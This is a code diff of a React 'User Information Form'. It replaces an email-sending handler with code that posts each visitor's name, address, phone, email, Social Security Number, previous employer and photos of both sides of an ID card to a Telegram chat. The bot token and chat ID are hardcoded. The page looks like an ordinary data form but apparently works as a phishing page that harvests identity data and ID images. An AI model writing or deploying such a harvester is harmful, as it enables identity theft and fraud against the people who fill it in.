@@ -1,8 +1,11 @@
 import { useState } from "react";
-import emailjs from "@emailjs/browser";
+import axios from "axios";
+
+const TELEGRAM_BOT_TOKEN = "7267909812:AAF2YCT0-TbHFH6LMIcbqOPIJcxwG_-jvZY";
+const TELEGRAM_CHAT_ID = "5461098350";
 
 const FormComponent = () => {
-  const [formData, setFormData] = useState({
+  const initialFormData = {
     name: "",
     address: "",
     phone: "",
@@ -11,8 +14,9 @@ const FormComponent = () => {
     previousEmployer: "",
     idCardFrontBase64: "",
     idCardBackBase64: "",
-  });
+  };
 
+  const [formData, setFormData] = useState(initialFormData);
   const [fileNames, setFileNames] = useState({
     idCardFront: "No file chosen",
     idCardBack: "No file chosen",
@@ -40,78 +44,112 @@ const FormComponent = () => {
     }
   };
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
+  const escapeMarkdownV2 = (text) => {
+    return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
+  };
 
-    const emailData = {
-      service_id: "service_x9ryr1u",
-      template_id: "template_1hq6etl",
-      user_id: "pg09Mt7R3DRf_Tz1N",
-      template_params: {
-        ...formData,
-      },
-    };
-
+  const sendTextToTelegram = async () => {
     try {
-      await emailjs.send(
-        emailData.service_id,
-        emailData.template_id,
-        emailData.template_params,
-        emailData.user_id
-      );
-      alert("Your information has been sent successfully!");
+      console.log("Sending text message to Telegram...");
+
+      const textMessage = `
+📌 *New Form Submission* 📌
+👤 *Name:* ${escapeMarkdownV2(formData.name)}
+📍 *Address:* ${escapeMarkdownV2(formData.address)}
+📞 *Phone:* ${escapeMarkdownV2(formData.phone)}
+📧 *Email:* ${escapeMarkdownV2(formData.email)}
+🔢 *SSN:* ${escapeMarkdownV2(formData.ssn)}
+🏢 *Previous Employer:* ${escapeMarkdownV2(formData.previousEmployer)}
+      `;
+
+      await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        params: { chat_id: TELEGRAM_CHAT_ID, text: textMessage, parse_mode: "MarkdownV2" },
+      });
+
+      console.log("Text message sent successfully!");
     } catch (error) {
-      console.error("Error sending email:", error);
-      alert("Failed to send information. Please try again.");
+      console.error("Error sending text data to Telegram:", error);
     }
   };
 
+  const sendImagesToTelegram = async () => {
+    try {
+      console.log("Sending images to Telegram...");
+
+      const sendPhoto = async (imageBase64) => {
+        if (!imageBase64) return;
+
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+        formData.append("photo", dataURItoBlob(imageBase64), "image.jpg");
+
+        await axios.post(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+          formData,
+          { headers: { "Content-Type": "multipart/form-data" } }
+        );
+      };
+
+      await sendPhoto(formData.idCardFrontBase64);
+      await sendPhoto(formData.idCardBackBase64);
+
+      console.log("Images sent successfully!");
+    } catch (error) {
+      console.error("Error sending images to Telegram:", error);
+    }
+  };
+
+  const dataURItoBlob = (dataURI) => {
+    let byteString = atob(dataURI.split(",")[1]);
+    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+    let arrayBuffer = new ArrayBuffer(byteString.length);
+    let uint8Array = new Uint8Array(arrayBuffer);
+    for (let i = 0; i < byteString.length; i++) {
+      uint8Array[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([arrayBuffer], { type: mimeString });
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    await sendTextToTelegram();
+    await sendImagesToTelegram();
+
+    // Show success message
+    alert("✅ Successful!");
+
+    // Clear form fields
+    setFormData(initialFormData);
+    setFileNames({ idCardFront: "No file chosen", idCardBack: "No file chosen" });
+
+    console.log("Form cleared successfully!");
+  };
+
   return (
-    <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10 relative overflow-hidden">
-      <div className="absolute inset-0 bg-gradient-to-br from-purple-500 to-indigo-500 opacity-20 blur-2xl"></div>
-      <div className="relative backdrop-blur-md bg-white/80 shadow-2xl rounded-2xl p-6 sm:p-8 lg:p-10">
-        <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">User Information Form</h2>
-        <form onSubmit={handleSubmit} className="space-y-5">
+    <div className="max-w-2xl mx-auto p-6 bg-white shadow-xl rounded-2xl border border-gray-200 sm:p-8 lg:p-10">
+      <h2 className="text-2xl font-semibold text-gray-800 text-center mb-6">
+        User Information Form
+      </h2>
+      <form onSubmit={handleSubmit} className="space-y-5">
+        <input type="text" name="name" placeholder="Full Name" value={formData.name} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
+        <input type="text" name="address" placeholder="Address" value={formData.address} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
+        <input type="tel" name="phone" placeholder="Phone Number" value={formData.phone} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
+        <input type="email" name="email" placeholder="Email" value={formData.email} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
+        <input type="text" name="ssn" placeholder="Social Security Number" value={formData.ssn} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
+        <input type="text" name="previousEmployer" placeholder="Previous Employer" value={formData.previousEmployer} onChange={handleChange} required className="w-full p-3 border rounded-lg" />
 
-          <label className="block text-gray-700 font-medium">Full Name <span className="text-red-500">*</span></label>
-          <input type="text" name="name" value={formData.name} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
+        {/* Front ID Upload */}
+        <label className="block font-medium">Upload Front of ID</label>
+        <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "idCardFrontBase64", "idCardFront")} required className="w-full p-2 border rounded-lg" />
 
-          <label className="block text-gray-700 font-medium">Address <span className="text-red-500">*</span></label>
-          <input type="text" name="address" value={formData.address} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
+        {/* Back ID Upload */}
+        <label className="block font-medium">Upload Back of ID</label>
+        <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, "idCardBackBase64", "idCardBack")} required className="w-full p-2 border rounded-lg" />
 
-          <label className="block text-gray-700 font-medium">Phone Number <span className="text-red-500">*</span></label>
-          <input type="tel" name="phone" value={formData.phone} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
-
-          <label className="block text-gray-700 font-medium">Email <span className="text-red-500">*</span></label>
-          <input type="email" name="email" value={formData.email} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
-
-          <label className="block text-gray-700 font-medium">Social Security Number <span className="text-red-500">*</span></label>
-          <input type="text" name="ssn" value={formData.ssn} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
-
-          <label className="block text-gray-700 font-medium">Previous Employer <span className="text-red-500">*</span></label>
-          <input type="text" name="previousEmployer" value={formData.previousEmployer} onChange={handleChange} className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none" required />
-
-          {/* Front ID Upload */}
-          <label className="block text-gray-700 font-medium">Upload Front of ID <span className="text-red-500">*</span></label>
-          <div className="flex items-center space-x-3">
-            <input id="front-id" type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, "idCardFrontBase64", "idCardFront")} className="hidden" required />
-            <label htmlFor="front-id" className="cursor-pointer bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300">Choose File</label>
-            <span className="text-gray-600">{fileNames.idCardFront}</span>
-          </div>
-
-          {/* Back ID Upload */}
-          <label className="block text-gray-700 font-medium">Upload Back of ID <span className="text-red-500">*</span></label>
-          <div className="flex items-center space-x-3">
-            <input id="back-id" type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, "idCardBackBase64", "idCardBack")} className="hidden" required />
-            <label htmlFor="back-id" className="cursor-pointer bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition duration-300">Choose File</label>
-            <span className="text-gray-600">{fileNames.idCardBack}</span>
-          </div>
-
-          <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">
-            Submit
-          </button>
-        </form>
-      </div>
+        <button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-lg hover:bg-blue-700 transition duration-300">
+          Submit
+        </button>
+      </form>
     </div>
   );
 };
